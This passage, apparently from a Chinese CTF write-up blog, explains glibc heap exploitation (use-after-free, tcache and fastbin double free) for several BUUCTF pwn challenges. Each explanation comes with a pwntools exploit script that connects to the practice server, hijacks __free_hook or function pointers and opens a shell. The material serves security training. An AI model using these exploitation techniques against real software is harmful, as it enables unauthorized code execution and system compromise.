class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x60</span>,p64(free_hook))<br>add(<span class="hljs-number">0x60</span>,p64(free_hook))<br>add(<span class="hljs-number">0x60</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>最后，那个有fortify保护，好像也能利用来泄露<br>参考师傅：<a href="https://www.cnblogs.com/remon535/p/14122719.html">https://www.cnblogs.com/remon535/p/14122719.html</a></p><h3 id="icoctf-2018-are-you-root">icoctf_2018_are you root</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121140324?spm=1001.2014.3001.5502">picoctf_2018_are you root_Nqoinaen的博客-CSDN博客</a><br>程序功能到达level5能打出flag，正常运行的话不会让你到达level5</p><h4 id="直接说解法：">直接说解法：</h4><p>就是输name的我们填满8个a，然后就可以改到level参数<br>strdup会把name copy下去，包括level参数，我们free它的话，释放到tcachebin0x20，level参数还在，我们再login的话，如果是0x20大小，就从tcachebin中取，level参数未初始化，还是5。就能接受flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./PicoCTF_2018_are_you_root&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29317</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------</span><br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;login aaaaaaaa&#x27;</span>+p64(<span class="hljs-number">5</span>))<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;reset&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;login aaaa&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;get-flag&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="bjdctf-2020-YDSneedGrirlfriend">bjdctf_2020_YDSneedGrirlfriend</h3><p>（uaf）</p><p>利用思路：<br>申请size同为0x20大小的chunk，<br>doublefree<br>申请个不同size的chunk，使从bin链中取出一个0x20<br>位置就置换了，我们就能控制前面图片中说的要改的那个指针的值了<br>我们add 0x20 size，把它改为后门地址<br>然后show就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./bjdctf_2020_YDSneedGrirlfriend&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27737</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Her name size is :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">&#x27;Her name is :&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#---------------------------------</span><br>backdoor=<span class="hljs-number">0x400b9c</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(backdoor))<br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-signin">gyctf_2020_signin</h3><p>参考师傅：<a href="https://blog.csdn.net/yongbaoii/article/details/114242840?ops_request_misc=%7B%22request%5Fid%22%3A%22163603094916780261991969%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163603094916780261991969&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-114242840.pc_search_mgc_flag&amp;utm_term=gyctf_2020_signin&amp;spm=1018.2226.3001.4187">yongbaoii</a></p><p>calloc 有以下特性</p><p>不会分配 tcache chunk 中的 chunk 。</p><p>tcache 有以下特性</p><p>在分配 fastbin 中的 chunk 时若还有其他相同大小的 fastbin_chunk 则把它们全部放入 tcache 中。</p><p>大致思路：<br>最终目的就是把bin链写到ptr里<br>就是利用上面的特性，我们要创造个fastbinchunk给他分配，利用uaf改写fd，使fastbin链指向ptr<br>我们add一个，在tcache留个空位，calloc分配一个fastbin，第二个特性把ptr挂入tcachebin，也就是写了点数据<br>（-0x10，估计也是特性，具体位置的话可以调试看看）</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./gyctf_2020_signin&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26068</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#--------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#-------------------------------------------------</span><br>add(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">7</span>)<br>edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x4040C0</span>-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">1</span>)<br>sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="actf-2019-babyheap">actf_2019_babyheap</h3><p>一般有时间的就有system</p><p>没啥好说的<br>可以看我前面的文章：<br><a href="https://blog.csdn.net/m0_51251108/article/details/121141201?spm=1001.2014.3001.5502">https://blog.csdn.net/m0_51251108/article/details/121141201?spm=1001.2014.3001.5502</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ACTF_2019_babyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input size: \n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;Please input content: \n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input list index: \n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input list index: \n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------------</span><br>binsh=<span class="hljs-number">0x602010</span><br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(binsh)+p64(system))<br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-easyfast">wustctf2020_easyfast</h3><p>这题是libc2.23的doublefree，注意区别<br>引用这位师傅的回顾double free手法</p><p>在glibc2.27之前，主要是fastbin double free：<br>fastbin在free时只会检查现在释放的chunk，是不是开头的chunk，因此可以通过free(C1), free(C2),<br>free(C1)的手法绕过 并在在fastbin取出时，会检查size字段是不是属于这个fastbin，因此往往需要伪造一个size<br>glibc2.27~glibc2.28，主要是tcache double free 相较于fastbin double<br>free，tcache完全没有任何检查，只需要free(C1), free(C1)就可以构造一个环出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./wustctf2020_easyfast&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    